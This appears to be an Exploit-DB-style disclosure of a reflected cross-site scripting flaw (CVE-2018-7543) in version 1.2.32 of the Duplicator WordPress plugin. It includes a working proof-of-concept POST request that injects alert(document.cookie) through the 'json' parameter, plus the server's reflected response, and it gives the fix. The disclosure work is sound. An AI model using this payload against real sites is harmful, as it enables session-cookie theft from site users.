@@ -1,0 +1,69 @@
+# Exploit Title : Duplicator Wordpress Migration Plugin Reflected Cross Site Scripting (XSS)
+# Date: 25-02-2018 
+# Exploit Author : Stefan Broeder
+# Contact : https://twitter.com/stefanbroeder
+# Vendor Homepage: https://snapcreek.com/
+# Software Link: https://wordpress.org/plugins/duplicator/
+# Version: 1.2.32
+# CVE : CVE-2018-7543
+# Category : webapps
+
+Description
+===========
+Duplicator is a wordpress plugin with more than 1 million of active installations. Version 1.2.32 (and possibly previous versionss) are affected by a Reflected XSS vulnerability.
+
+Vulnerable part of code
+=======================
+File: duplicator/installer/build/view.step4.php:254 allows direct injection of $_POST variable 'json'.
+
+Impact
+======
+Arbitrary JavaScript code can be run on browser side if a user is tricked to click over a link or browse a URL under the attacker control.
+
+Proof of Concept
+============
+In order to exploit this vulnerability, an attacker has to send the following request to the server:
+
+POST /wp-content/plugins/duplicator/installer/build/view.step4.php HTTP/1.1
+Host: <hostname>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: wordpress_5c016e8f0f95f039102cbe8366c5c7f3=wp%7C1518599198<omissis>
+Connection: close
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
+
+json='a';};document.write(alert(document.cookie));MyViewModel%3dfunction(){this.status%3d''
+
+The server replies as reported below:
+
+HTTP/1.1 200 OK
+Date: Mon, 12 Feb 2018 14:15:28 GMT
+Server: Apache/2.4.29 (Debian)
+Vary: Accept-Encoding
+Content-Length: 10224
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+...
+
+<script>
+MyViewModel = function() {
+this.status = 'a';};document.write(alert(document.cookie));MyViewModel=function(){this.status='';
+var errorCount = this.status.step2.query_errs || 0;
+(errorCount >= 1 )
+? $('#dup-step3-install-report-count').css('color', '#BE2323')
+: $('#dup-step3-install-report-count').css('color', '#197713')
+};
+ko.applyBindings(new MyViewModel()); 
+</script>
+
+Solution
+========
+
+Update to version 1.2.33
